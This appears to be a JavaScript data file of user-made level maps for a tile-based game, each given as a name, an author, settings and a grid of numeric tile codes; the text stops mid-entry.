maps.push({name="Me when femboy",author="Many",id="#1685325559",direction="forward",cost=250,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,1,5,5,25,25,25,25,25,25,25,25,25,25,25,25,1,1,1,1,25,1,0,5,5,5,5,25,25,25,25,25,25,25,25,1,0,0,0,1,25,1,0,5,0,0,5,5,1,1,25,25,25,25,1,1,0,0,1,25,25,5,0,5,0,0,0,5,0,1,25,25,25,25,1,0,0,1,1,25,25,5,0,5,0,0,0,5,0,1,26,26,26,1,1,0,0,1,25,25,25,5,0,5,0,0,0,5,0,1,27,27,27,1,0,0,1,1,25,25,25,5,0,5,0,0,0,5,0,1,28,28,28,1,0,0,5,25,25,25,25,5,0,5,0,0,0,5,0,1,1,29,29,1,0,0,5,25,25,25,25,5,0,5,0,0,0,5,0,0,1,30,30,1,0,0,65,65,65,65,65,0,0,5,0,0,0,5,0,0,1,31,31,1,1,0,65,65,65,65,65,0,0,5,0,0,0,5,0,0,1,32,32,32,1,0,0,0,0,65,65,0,0,5,0,0,0,5,0,0,1,1,32,100,1,0,0,0,0,65,65,0,0,5,0,0,0,5,0,0,0,1,1,1,1,0,0,0,0,65,65,0,0,5,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,5,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,5,0,100,0,5,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Yellow Spring",author="TheShy",id="#1685443124",direction="forward",cost=200,elevation=0,map=[24,67,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,67,24,24,67,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,67,24]});
maps.push({name="Museum",author="TheShy",id="#1685446225",direction="forward",cost=552,elevation=0,map});
maps.push({name="DEADCORE EASY D",author="TheShy",id="#1685601502",direction="forward",cost=330,elevation=0,map=[2,2,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,14,14,14,199,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,199,14,14,14,199,0,0,174,0,0,190,0,0,180,0,0,177,0,0,0,199,14,14,14,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,14,14,14,199,0,0,93,133,0,14,133,0,14,133,0,14,133,0,0,199,134,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,14,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,14,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,14,14,14,199,0,0,14,14,0,14,14,0,14,14,0,14,14,0,0,199,14,14,14,199,0,0,132,14,0,132,14,0,132,14,0,132,93,0,0,199,14,14,14,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,14,14,14,199,0,0,173,170,0,182,170,0,179,170,0,176,170,0,0,199,14,14,14,199,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,199,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,96,96,14,97,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,131,96,96,2,2]});
maps.push({name="blunt smoker",author="Many",id="#1686019677",direction="forward",cost=365,elevation=0,map=[0,0,0,5,5,5,5,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,146,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,146,146,146,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,76,146,146,146,146,146,146,5,5,0,5,5,0,0,0,0,0,0,5,76,146,146,146,146,146,146,146,146,5,5,65,5,0,0,0,0,0,0,5,5,5,5,5,5,5,146,146,146,146,5,65,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,65,65,65,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,65,5,0,0,0,5,5,5,0,0,0,5,5,5,5,5,65,65,65,65,65,5,0,5,5,5,65,5,5,5,5,5,65,65,65,5,5,65,65,65,65,5,5,5,65,65,65,5,75,75,75,5,65,65,65,65,5,65,65,65,65,5,5,65,65,65,65,5,1,1,75,5,65,65,65,65,5,5,65,65,5,5,5,5,65,65,65,5,75,75,75,5,65,65,65,65,65,5,65,5,5,0,0,5,5,5,5,5,5,5,5,5,65,65,65,65,65,65,65,5,0,0,5,5,65,65,65,5,75,75,75,5,65,65,65,65,65,65,65,5,0,0,5,65,65,65,65,5,1,1,75,5,65,65,65,65,65,5,5,0,0,0,5,5,65,65,65,5,75,75,75,5,65,65,65,5,5,0,0,0,0,0,0,5,5,5,65,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Marble Madness 1",author="ZeeGee",id="#1686643156",direction="forward",cost=281,elevation=-9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,23,93,23,87,23,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,22,22,22,22,22,22,22,22,22,22,22,22,22,22,93,22,94,22,0,0,21,21,21,0,0,0,21,21,21,21,0,0,0,21,21,21,21,21,0,0,21,21,21,0,0,0,21,144,144,21,0,0,0,21,21,21,21,21,0,0,21,88,21,0,0,0,21,21,21,21,0,0,0,21,21,21,21,21,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,91,91,91,0,0,20,20,20,88,20,20,20,20,20,20,20,20,20,20,20,91,97,91,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,91,91,91,0,0,0,0,0,19,19,19,0,0,0,19,19,19,19,0,0,0,19,19,0,0,0,0,0,18,144,18,0,0,0,18,18,18,18,0,0,0,18,18,0,0,0,0,0,17,17,17,0,0,0,17,17,17,17,0,0,0,17,17,0,17,17,17,17,16,16,16,17,17,17,17,17,17,17,17,17,17,17,17,0,17,89,17,17,15,15,15,17,17,17,17,17,17,17,17,17,17,17,17,0,17,17,15,15,15,15,15,17,17,17,17,17,17,17,17,94,17,94,17,0,17,15,15,15,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,15,15,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,15,15,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="baguette factory",author="alli",id="#1687042341",direction="right",cost=316,elevation=-15,map=[0,0,1,20,2,2,20,1,0,0,0,24,77,24,0,24,77,24,0,0,0,1,20,20,20,20,20,20,1,0,1,0,0,0,1,0,0,0,1,0,0,1,20,17,17,17,17,19,1,24,0,112,112,112,111,110,110,110,0,24,0,1,20,17,90,65,9998,18,1,77,0,112,112,112,111,110,110,110,0,82,0,1,20,17,65,90,17,17,1,24,0,112,112,0,1,0,110,110,0,24,0,1,20,3,17,17,17,17,1,0,1,113,113,1,0,1,109,109,1,0,0,1,143,1,1,1,1,117,1,24,0,114,114,0,24,0,108,108,0,24,1,57,9998,17,17,17,17,17,1,77,0,114,114,0,77,0,108,108,0,77,1,17,17,17,17,17,17,17,1,24,0,114,114,0,24,0,108,108,0,24,1,0,0,0,0,90,17,17,1,0,1,115,115,1,0,1,107,107,1,0,1,43,0,0,0,0,17,17,117,116,116,116,116,0,24,0,106,106,0,24,1,0,0,0,0,0,17,17,117,116,116,116,116,0,24,0,106,106,0,77,1,0,0,0,0,0,0,0,1,0,0,0,0,1,24,0,106,106,0,24,1,43,0,67,23,67,0,0,1,24,77,77,24,0,0,1,105,105,1,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,88,5,5,90,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,5,5,5,5,5,1,94,43,93,0,0,0,0,0,65,15,15,0,141,65,5,5,5,5,2,1,43,93,43,0,0,0,0,0,65,15,100,0,0,65,5,5,5,5,2,1,93,43,94,0,41,41,0,0,65,15,15,0,0,65,90,5,5,88,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="Swim upward",author="NyaaaDoge",id="#1687251119",direction="left",cost=178,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,24,24,90,0,0,0,0,59,44,44,59,77,0,0,0,0,5,5,5,90,2,24,24,24,24,24,24,44,66,66,44,0,0,0,0,0,5,5,5,5,2,24,24,24,24,24,24,44,66,66,44,0,0,0,0,0,5,5,5,5,24,24,90,0,0,0,0,59,44,44,59,77,0,0,0,0,90,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,50,35,35,50,0,0,0,0,0,45,30,30,45,0,0,0,0,0,0,0,35,66,66,35,10,10,10,10,10,30,66,66,30,0,0,0,0,0,0,0,35,66,66,35,10,10,10,10,10,30,66,66,30,0,0,0,0,0,0,0,50,35,35,50,0,0,0,0,0,45,30,30,45]});
maps.push({name="Lowgrav and water",author="NyaaaDoge",id="#1687251174",direction="left",cost=192,elevation=-19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,1,100,1,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,1,13,13,90,1,0,0,0,0,0,0,24,24,24,24,0,0,5,5,5,65,33,66,13,100,1,0,0,0,0,0,1,24,24,1,0,0,5,0,0,1,13,13,13,1,0,0,0,0,0,1,59,140,140,59,1,0,5,0,1,121,121,41,121,121,1,0,0,0,0,1,59,140,140,59,1,0,5,1,100,121,121,66,121,121,100,1,0,0,0,1,89,59,59,85,1,0,5,0,1,90,121,121,121,90,1,0,0,0,0,0,1,118,118,1,0,0,5,0,0,1,90,121,90,1,0,0,0,0,0,0,0,17,17,0,0,0,5,0,0,0,1,100,1,0,0,0,0,0,0,0,0,16,16,0,0,5,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,15,15,0,0,2,5,5,5,5,5,6,7,8,9,10,11,12,13,14,15,15,15,0,0,2,5,5,5,5,5,6,7,8,9,10,11,12,13,14,15,90,90,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger is NOT hard",author="NyaaaDoge",id="#1687251227",direction="forward",cost=192,elevation=-5,map=[172,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,54,54,0,0,0,0,0,1,0,0,0,0,0,1,90,14,54,54,54,54,54,54,54,54,54,54,14,90,1,0,0,0,0,0,14,14,54,54,54,54,54,54,54,54,54,54,14,14,0,0,0,0,0,0,14,14,189,0,0,0,0,0,0,0,0,189,14,14,0,0,0,0,0,0,14,14,44,93,0,0,0,0,0,0,93,44,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,0,0,0,169,0,0,169,0,0,0,14,14,0,0,0,0,0,0,14,14,0,0,0,173,43,43,177,0,0,0,14,14,0,0,0,0,0,0,14,14,14,14,0,43,66,66,43,0,14,14,14,14,0,0,0,0,0,0,14,14,14,14,0,43,66,66,43,0,14,14,14,14,0,0,0,0,0,0,14,14,1,0,0,178,43,43,174,0,0,1,14,14,0,0,0,0,0,0,13,13,1,183,0,0,0,0,0,0,183,1,13,13,0,0,0,0,0,0,13,13,1,35,0,0,0,0,0,0,35,1,13,13,0,0,0,0,0,0,12,12,1,35,183,183,100,100,183,183,35,1,12,12,0,0,0,0,0,0,12,12,88,1,1,1,1,1,1,1,1,88,12,12,0,0,0,0,0,0,11,11,11,10,10,9,9,9,9,10,10,11,11,11,0,0,0,0,0,1,90,11,11,10,10,9,9,9,9,10,10,11,11,90,1,0,0,0,0,0,1,0,0,0,0,0,2,2,0,0,0,0,0,1,0,0,0]});
maps.push({name="RACE straight",author="NyaaaDoge",id="#1687253073",direction="forward",cost=149,elevation=-7,map=[0,0,0,0,0,0,0,36,14,2,2,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,91,14,91,90,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,90,91,91,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,90,14,90,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,14,14,14,14,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,14,14,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,35,7,7,7,7,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,90,7,7,7,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,7,7,7,7,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,7,91,7,90,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,7,7,7,7,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,90,7,91,7,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,7,7,7,7,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,7,91,7,90,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,7,2,2,7,29,0,0,0,0,0,0,0]});
maps.push({name="a",author="NyaaaDoge",id="#1688463765",direction="left",cost=146,elevation=5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,75,75,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,10,10,10,10,10,10,0,0,0,0,0,0,11,11,0,0,0,0,0,11,11,0,0,0,11,11,11,0,0,0,0,0,12,12,0,0,0,0,12,12,0,0,0,0,0,12,12,0,0,0,0,0,13,13,0,0,0,13,13,0,0,0,0,0,0,13,13,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,14,14,14,0,0,2,90,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,2,90,14,14,14,0,0,14,14,0,0,0,0,0,14,14,0,0,0,0,0,0,0,15,15,0,0,15,15,0,0,0,0,15,15,0,0,0,0,0,0,0,0,16,16,0,0,16,16,0,0,16,16,16,0,0,0,100,100,0,0,0,0,17,17,0,0,17,17,17,17,17,0,0,0,0,0,17,17,0,0,0,0,18,18,0,0,18,18,18,0,0,0,0,0,0,0,18,18,0,0,0,0,19,19,0,0,0,19,19,0,0,0,0,0,0,0,19,19,0,0,0,0,20,20,0,0,0,20,20,20,0,0,0,0,0,20,20,0,0,0,0,0,21,21,0,0,0,0,21,21,0,0,0,0,21,21,0,0,0,0,0,0,88,88,0,0,0,0,0,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Never gonna get them",author="NyaaaDoge",id="#1688583336",direction="left",cost=274,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,1,97,93,97,1,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,1,119,119,119,1,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,1,90,158,90,1,0,14,14,14,94,0,0,0,1,1,1,1,1,1,1,89,114,114,114,1,0,14,14,14,14,0,0,1,90,14,14,91,14,14,90,1,114,114,114,1,0,90,14,14,14,0,0,1,14,14,91,14,91,14,91,1,109,109,158,1,0,14,14,14,14,0,0,1,14,91,0,0,0,91,14,1,109,90,109,1,0,14,14,14,90,0,0,1,91,14,0,0,1,14,14,1,158,109,109,1,0,14,14,14,14,2,14,91,14,14,0,0,1,95,95,1,105,105,90,1,0,0,114,114,0,2,91,14,14,90,0,0,1,114,114,1,105,132,105,1,0,0,114,114,0,0,0,1,1,1,1,1,90,114,114,1,96,96,96,1,0,0,114,114,0,0,0,0,0,0,0,0,114,90,91,1,105,133,105,1,0,0,90,114,1,0,0,0,0,0,0,0,90,91,114,134,114,114,114,114,90,114,114,96,94,0,0,0,0,0,0,0,91,114,114,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,131,1,131,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,131,1,131,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,1,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0]});
maps.push({name="Down to a hall",author="NyaaaDoge",id="#1688583375",direction="forward",cost=270,elevation=-5,map=[0,0,0,0,0,0,0,0,16,2,2,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,24,16,16,90,16,16,16,93,51,16,16,90,16,16,16,24,0,0,0,0,24,99,51,16,16,94,16,51,51,16,16,16,16,51,99,24,0,0,0,0,24,51,90,51,16,90,16,51,88,16,90,16,51,90,51,24,0,0,0,0,24,51,51,51,51,16,16,51,51,16,16,51,88,51,51,24,0,0,0,0,24,51,90,11,51,51,16,51,51,16,51,90,51,11,51,24,0,0,0,0,24,51,97,51,51,51,51,98,98,51,51,51,97,51,51,24,0,0,0,0,24,11,51,51,88,51,11,51,51,51,11,51,51,51,51,24,0,0,0,0,24,51,51,51,51,51,51,51,51,90,51,51,90,51,89,24,0,0,0,0,24,51,51,90,51,90,51,51,90,51,51,51,51,51,51,24,0,0,0,0,24,51,51,51,51,51,51,111,111,51,51,90,51,51,51,24,0,0,0,0,24,51,51,90,51,51,111,111,90,111,51,51,51,90,51,24,0,0,0,0,24,97,51,51,51,111,111,111,111,111,111,51,51,51,97,24,0,0,0,0,24,24,24,24,24,24,24,90,111,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,24,96,96,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,111,111,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,111,111,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Reversed Pressure 1",author="NyaaaDoge",id="#1689235084",direction="forward",cost=285,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,114,114,2,2,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,90,114,114,1,0,0,0,0,0,1,90,114,114,114,114,114,0,114,195,114,114,114,114,1,0,0,0,0,0,1,114,99,114,90,114,114,0,114,195,114,114,96,96,1,0,0,0,0,0,1,114,114,1,0,0,0,0,1,1,1,1,14,14,0,0,0,0,0,0,1,0,0,1,77,0,0,0,0,0,0,1,15,15,0,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,77,1,16,16,0,0,0,0,0,0,1,90,114,114,114,90,114,114,90,99,0,1,17,17,0,0,0,0,0,0,1,114,114,114,114,114,114,114,114,114,0,1,17,17,90,0,0,0,0,0,1,96,96,1,0,0,0,0,0,0,77,1,17,17,90,0,0,0,0,0,1,114,93,199,67,0,0,0,114,114,0,1,17,17,0,0,0,0,0,0,1,114,99,199,67,0,0,0,114,114,0,1,16,16,0,0,0,0,0,0,1,96,96,1,0,0,0,0,0,0,77,1,15,15,0,0,0,0,0,0,1,114,114,114,90,114,114,90,114,114,0,1,114,114,1,1,1,0,0,0,1,90,99,114,114,114,114,114,114,99,0,1,143,143,1,97,97,1,0,0,1,114,114,1,1,1,1,1,1,1,1,1,143,143,1,114,114,1,0,0,0,14,14,14,0,14,14,0,14,114,114,114,114,114,114,95,90,1,0,0,0,14,14,14,0,14,14,0,14,114,114,114,98,98,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0]});
maps.push({name="Reversed Pressure 2",author="NyaaaDoge",id="#1689235122",direction="forward",cost=238,elevation=0,map=[1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,0,67,0,67,0,1,1,1,0,0,1,90,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,114,114,1,0,0,90,14,95,14,14,14,14,0,14,14,14,14,14,0,195,114,114,1,0,0,14,14,95,14,14,90,14,0,14,90,14,14,14,0,195,114,90,1,0,0,14,14,0,0,0,0,0,0,0,0,0,0,1,1,1,114,114,1,0,0,14,14,0,0,0,67,0,67,0,1,1,1,0,0,1,96,96,1,0,0,14,14,0,0,1,1,1,1,1,0,0,0,90,93,1,114,114,1,0,0,95,95,0,0,0,0,0,0,0,0,0,0,24,24,24,14,14,0,0,0,14,14,0,0,0,38,95,0,0,42,95,0,24,24,97,14,14,0,0,0,14,90,0,0,0,38,95,0,0,42,95,0,24,24,97,14,14,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,24,24,24,14,90,0,0,0,14,14,0,36,36,0,0,40,40,0,0,0,90,94,0,14,14,0,0,0,14,14,0,36,36,0,0,40,40,0,0,0,0,0,0,14,14,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,90,14,0,0,0,114,114,114,143,0,0,0,0,0,40,40,38,38,36,36,14,14,0,0,0,90,114,114,143,0,0,0,0,0,40,40,38,38,36,36,14,14,0,0,0,114,96,96,143,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lane",author="NyaaaDoge",id="#1689235204",direction="left",cost=248,elevation=-3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,90,14,0,0,0,0,1,114,90,114,1,0,0,1,67,0,67,1,0,0,14,14,0,1,0,0,1,54,54,54,120,39,39,119,40,93,40,119,39,40,54,54,40,120,1,0,1,54,54,54,120,39,39,119,40,93,40,119,39,40,54,54,40,132,1,0,1,114,14,114,1,0,0,1,67,0,67,1,0,0,14,14,0,1,0,0,14,14,0,14,14,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,13,14,0,14,90,14,0,0,0,77,0,0,0,14,14,0,0,0,0,12,12,0,0,0,14,14,0,0,67,24,67,0,0,14,14,0,0,0,0,11,11,0,0,0,14,14,0,0,67,24,67,0,0,14,90,0,0,0,0,90,11,0,0,0,14,90,0,0,0,77,0,0,0,14,14,0,0,0,0,11,11,0,0,0,14,14,0,0,0,0,0,0,0,14,14,0,0,0,0,11,11,0,1,0,0,14,14,0,77,1,77,0,14,14,0,0,1,0,0,11,90,4,119,39,40,54,54,40,39,119,39,40,54,54,40,39,119,1,0,11,90,4,119,39,40,54,54,40,39,119,39,40,54,54,40,39,131,1,0,11,11,0,1,0,0,14,14,0,77,1,77,0,14,14,0,0,1,0,0,2,11,0,0,0,0,90,14,0,0,0,0,0,90,14,0,0,0,0,0,2,11,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,90,14,14,14,0,0,0,0,0,0]});
maps.push({name="Charmander",author="pee",id="#1690650901",direction="right",cost=214,elevation=-2,map=[0,0,0,0,0,0,0,0,2,2,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,120,120,121,122,1,0,1,121,1,1,1,0,0,0,0,0,0,0,1,120,121,121,122,76,122,1,121,120,1,120,18,1,0,0,0,0,0,1,120,121,122,122,1,76,122,76,122,122,121,120,18,1,0,0,0,0,0,1,120,121,122,122,122,122,122,76,38,38,121,120,18,1,0,0,0,0,0,1,120,121,122,122,122,122,122,3,38,38,38,121,1,0,0,0,0,0,0,1,121,121,122,122,122,122,122,3,38,38,38,38,1,0,0,0,0,0,0,1,120,121,122,122,122,122,122,3,38,38,38,121,1,0,0,0,0,0,0,1,120,121,122,122,122,122,122,76,38,38,121,120,18,1,0,0,0,0,0,1,120,121,122,122,1,76,122,76,122,122,121,120,18,2,0,0,0,0,0,0,1,120,121,121,122,76,121,1,121,122,121,120,18,2,0,0,0,0,0,0,0,1,120,120,121,122,1,0,1,121,121,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,0,1,0,1,122,121,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,76,1,122,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,76,134,134,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,76,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Pond",author="NyaaaDoge",id="#1690711502",direction="forward",cost=293,elevation=-2,map=[14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,15,15,0,0,0,0,0,0,0,0,0,67,24,90,23,22,90,1,0,0,15,15,0,0,0,17,17,17,17,90,0,0,100,24,23,22,22,1,0,0,15,15,15,16,17,17,17,17,17,17,17,67,24,24,23,91,91,1,0,0,0,16,16,16,17,65,90,66,66,17,17,0,0,1,1,95,95,0,0,0,0,1,17,17,17,65,66,66,66,17,90,0,0,0,0,21,21,0,0,0,0,17,17,65,65,90,66,90,66,17,17,18,18,19,19,20,20,0,0,0,0,17,90,66,66,66,66,94,66,17,17,18,18,19,19,20,90,0,0,0,0,17,17,66,66,90,66,66,66,17,17,0,0,0,